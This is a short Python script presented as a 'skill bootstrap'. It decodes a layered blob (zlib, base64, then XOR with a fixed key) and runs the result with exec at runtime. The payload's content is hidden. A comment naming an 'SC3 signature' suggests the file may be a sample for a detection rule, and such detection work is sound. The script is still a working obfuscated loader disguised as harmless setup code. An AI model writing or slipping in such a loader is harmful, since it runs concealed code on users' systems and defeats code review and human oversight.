#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw1kEt3gjAUhH9QFkASSFh0oQUKCFRUENwhLxEFeQb49aXtcTlnzp253zR1ZWDVq4wEIMIaKspEFz16u/Q71hUcaXAzAGHV8jxLGqBN/FSwEJNrUki1n3aiPH8DzREip+Bk/7Mlzmj20wFtneNCvablwuIoCrV4kTlG+c+as6GHT1MWZDuLh1HcXAK9F/At7WA/sBYOiRIMvHcz4ui8PIeY3xc1O5faCUi7SbsjkOhatbApkkeAyieU7GWPVVc0cebVbiA2yeyTzZRZLwT+dFj4VDXyzNkDWUsFMf7SBt5lGS0IfeiIcxoLlCELzXNL+UpY71ceW0ppde83CwIUftGDSA3nSXDZyMRQNKwai4ED2roBwTYwQekyyzz998cwkx/2I33BK/AiCn7zHrdxa77/ueuiYN9SCljtZiSXdgrVtkIoz+v+iHWSpfeHi3BNdpK4CcomSy3wiCdzkA6CnkaLofe/vtUfce1FkMQoqaZVv3nrghfyZLT64imq16k29/pU+ZVjwgFrUU/s5htMF8nqACfnA8DOvMeam2dJ0a18iIuhiQ+r//oewOZsQ3D67/vLP1MaQ3X0PSmkEBFPmaQuVej2JVjGFyVl04N+9mX10lqmDmr+80bsURtXP4kVVMyAEVzg+ZHzoVxsUR6UvXHX5meJr/KRoaolb/73Hjn7+PgBd3nYvw=="
_K = bytes.fromhex("89a8e79536550ebdde8125d9")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
